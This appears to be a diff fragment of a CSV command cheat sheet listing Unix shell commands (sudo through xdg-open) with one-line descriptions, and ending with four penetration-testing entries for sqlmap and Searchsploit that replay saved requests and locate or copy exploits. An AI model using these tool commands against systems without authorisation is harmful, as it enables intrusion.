+865, sudo,Execute a command as another user,Shell
+866, sum,Print a checksum for a file,Shell
+867, suspend,Suspend execution of this shell,Shell
+868, symlink,Make a new name for a file,Shell
+869, sync,Synchronize data on disk with memory,Shell
+870, tail,Output the last part of file,Shell
+871, tar,Tape Archiver,Shell
+872, tee,Redirect output to multiple files,Shell
+873, test,Evaluate a conditional expression,Shell
+874, time,Measure Program running time,Shell
+875, times,User and system times,Shell
+876, touch,Change file timestamps,Shell
+877, top,List processes running on the system,Shell
+878, traceroute,Trace Route to Host,Shell
+879, trap,Run a command when a signal is set(bourne),Shell
+880, tr,"Translate, squeeze, and/or delete characters",Shell
+881, true,"Do nothing, successfully",Shell
+882, tsort,Topological sort,Shell
+883, tty,Print filename of terminal on stdin,Shell
+884, type,Describe a command,Shell
+885,ulimit,Limit user resources,Shell
+886, umask,Users file creation mask,Shell
+887, umount,Unmount a device,Shell
+888, unalias,Remove an alias,Shell
+889, uname,Print system information,Shell
+890, unexpand,Convert spaces to tabs,Shell
+891, uniq,Uniquify files,Shell
+892, units,Convert units from one scale to another,Shell
+893, unset,Remove variable or function names,Shell
+894, unshar,Unpack shell archive scripts,Shell
+895, until,Execute commands (until error),Shell
+896, uptime,Show uptime,Shell
+897, useradd,Create new user account,Shell
+898, usermod,Modify user account,Shell
+899, users,List users currently logged in,Shell
+900, uuencode,Encode a binary file,Shell
+901, uudecode,Decode a file created by uuencode,Shell
+902, v,Verbosely list directory contents (`ls -l -b’),Shell
+903, vdir,Verbosely list directory contents (`ls -l -b’),Shell
+904, vi,Text Editor,Shell
+905, vmstat,Report virtual memory statistics,Shell
+906, wait,Wait for a process to complete,Shell
+907, watch,Execute/display a program periodically,Shell
+908, wc,"Print byte, word, and line counts",Shell
+909, whereis,"Search the user’s $path, man pages and source files for a program",Shell
+910, which,Search the user’s $path for a program file,Shell
+911, while,Execute commands,Shell
+912, who,Print all usernames currently logged in,Shell
+913, whoami,Print the current user id and name (`id -un’),Shell
+914, wget,"Retrieve web pages or files via HTTP, HTTPS or FTP",Shell
+915, write,Send a message to another user,Shell
+916, xargs,"Execute utility, passing constructed argument lists",Shell
+917, xdg-open,Open a file or URL in the user’s preferred application,Shell
+918, yes,Print a string until interrupted,Shell
+919,sqlmap -r <request form.txt>,make a request using a form saved form burp/ZAP,SQLMap
+920,Searchsploit -p <exploit>,shows path to the exploit,Searchsploit
+921,Searchsploit -m <exploit>,Paste exploit in the current directory,Searchsploit
+922,Searchsploit -x <exploit>,open exploit with vi,Searchsploit
